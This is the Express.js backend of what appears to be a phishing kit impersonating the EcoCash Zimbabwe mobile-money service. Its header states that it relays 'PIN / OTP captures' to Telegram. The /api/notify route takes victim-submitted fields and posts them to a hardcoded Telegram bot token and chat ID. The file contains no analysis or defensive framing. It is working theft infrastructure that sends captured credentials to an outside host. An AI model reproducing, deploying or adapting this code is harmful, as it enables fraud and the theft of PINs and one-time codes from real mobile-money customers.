/**
 * EcoCash Zimbabwe — Backend
 * Serves static files (index.html, admin.html) and relays
 * PIN / OTP captures to Telegram.
 */

const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3005;

// ---- Telegram config (from environment variables on Railway) ----
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8834604760:AAHnFWeTawysGPNs6dnqvbOYquhC4cxhs1w';
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '8294270663';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

// ---- Serve static files (index.html, admin.html) ----
app.use(express.static(path.join(__dirname), { extensions: ['html'] }));

// ---- Notification relay ----
app.post('/api/notify', async (req, res) => {
  try {
    const {
      referenceId,
      serviceType,
      recipientName,
      destination,
      status,
      notes
    } = req.body || {};

    const text =
      `🔔 *EcoCash Notification*\n` +
      `━━━━━━━━━━━━━━━\n` +
      `📌 *Status:* ${status || '—'}\n` +
      `🧾 *Ref:* ${referenceId || '—'}\n` +
      `👤 *Recipient:* ${recipientName || '—'}\n` +
      `📱 *Destination:* ${destination || '—'}\n` +
      `💳 *Service:* ${serviceType || '—'}\n` +
      `📝 *Notes:* ${notes || '—'}\n` +
      `🕒 ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Harare' })} CAT`;

    const tgResponse = await fetch(TELEGRAM_API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'Markdown'
      })
    });

    const tgData = await tgResponse.json();
    if (!tgData.ok) {
      console.error('Telegram rejected:', tgData);
      return res.status(502).json({ ok: false, error: tgData.description });
    }

    return res.json({ ok: true });
  } catch (err) {
    console.error('Notify error:', err);
    return res.status(500).json({ ok: false, error: err.message });
  }
});

// Health check
app.get('/health', (req, res) => res.json({ ok: true, ts: Date.now() }));

app.listen(PORT, () => {
  console.log(`EcoCash server running on port ${PORT}`);
});
